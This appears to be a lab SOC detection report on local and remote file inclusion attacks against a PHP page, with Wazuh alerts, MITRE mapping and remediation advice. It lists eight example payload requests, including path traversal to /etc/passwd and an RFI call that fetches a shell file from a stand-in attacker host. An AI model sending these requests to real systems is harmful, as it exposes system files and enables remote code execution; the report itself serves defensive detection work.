# FILE INCLUSION DETECTION REPORT

## Executive Summary
- Detection Type: File Inclusion (LFI/RFI)
- Agent: kali (192.168.1.109)
- Web Server: Apache2
- Target: /var/www/html/include.php
- Total Alerts: 8
- Time Period: 2026-10-09 21:19:16 PKT
- Attack Source: 127.0.0.1 (localhost)

## Alert Details

| Rule ID | Description | Level | MITRE |
|---------|-------------|-------|-------|
| 31106 | Web attack returned code 200 | 6 | T1190 |

## Attack Payloads Detected

1. **Basic LFI:**
   GET /include.php?page=/etc/passwd

2. **Path Traversal LFI:**
   GET /include.php?page=../../../../etc/passwd

3. **PHP Filter Wrapper:**
   GET /include.php?page=php://filter/convert.base64-encode/resource=/etc/passwd

4. **Data Wrapper:**
   GET /include.php?page=data://text/plain;base64,...

5. **Input Wrapper:**
   GET /include.php?page=php://input

6. **Log Poisoning:**
   GET /include.php?page=/var/log/apache2/access.log

7. **Remote File Inclusion:**
   GET /include.php?page=http://attacker.com/shell.txt

8. **Null Byte:**
   GET /include.php?page=/etc/passwd%00

## MITRE ATT&CK Mapping
- **T1190** - Exploit Public-Facing Application
- **T1083** - File and Directory Discovery
- **Tactic:** Initial Access, Discovery

## Key Findings
1. Wazuh detected file inclusion payloads
2. 8 different inclusion techniques tested
3. LFI allows reading arbitrary files
4. RFI allows remote code execution

## Analysis
- File Inclusion = critical web vulnerability
- LFI: reads local files (/etc/passwd, configs)
- RFI: executes remote code from attacker server
- Real SOC: block IP, patch application, disable allow_url_include

## Recommended Actions
1. **Immediate:** No escalation (lab)
2. **Real SOC:** Block source IP
3. **Real SOC:** Whitelist allowed pages
4. **Real SOC:** Disable allow_url_include
5. **Improvement:** Add file inclusion rules
6. **Improvement:** Integrate Suricata

## Status
**CLOSED** - Lab simulation

## Analyst Notes
File Inclusion is one of the most dangerous web vulnerabilities.
It allows:
- Reading sensitive files (passwd, shadow, configs)
- Source code disclosure
- Remote code execution (RFI)
- Full server compromise

Detection relies on:
- URL parameter analysis (php://, data://, http://)
- Path traversal patterns (../)
- Response code monitoring
- Wazuh built-in rules (31100-31199)
